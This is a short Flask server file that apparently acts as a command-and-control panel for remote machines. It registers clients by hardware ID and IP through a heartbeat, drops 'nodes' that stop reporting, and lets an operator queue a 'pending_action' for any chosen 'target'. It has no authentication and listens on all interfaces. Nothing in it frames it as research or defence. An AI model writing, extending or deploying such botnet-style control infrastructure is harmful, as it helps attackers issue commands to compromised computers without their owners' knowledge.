import time
from flask import Flask, request, jsonify, render_template

app = Flask(__name__)

clients = {}

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/api/heartbeat', methods=['POST'])
def heartbeat():
    data = request.json
    hwid = data.get('hwid')
    ip = data.get('ip')
    if hwid:
        clients[hwid] = {
            "hwid": hwid,
            "ip": ip,
            "last_seen": time.time(),
            "pending_action": clients.get(hwid, {}).get("pending_action", "")
        }
    return "", 200

@app.route('/api/clients')
def get_clients():
    now = time.time()
    offline_nodes = [hwid for hwid, info in clients.items() if now - info["last_seen"] > 35]
    for hwid in offline_nodes:
        del clients[hwid]
    return jsonify(clients)

@app.route('/api/target-action', methods=['POST'])
def target_action():
    data = request.json
    hwid = data.get('hwid')
    action = data.get('action', '')
    if hwid in clients:
        clients[hwid]["pending_action"] = action
    return "", 200

@app.route('/api/clear-target', methods=['POST'])
def clear_target():
    data = request.json
    hwid = data.get('hwid')
    if hwid in clients:
        del clients[hwid]
    return "", 200

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
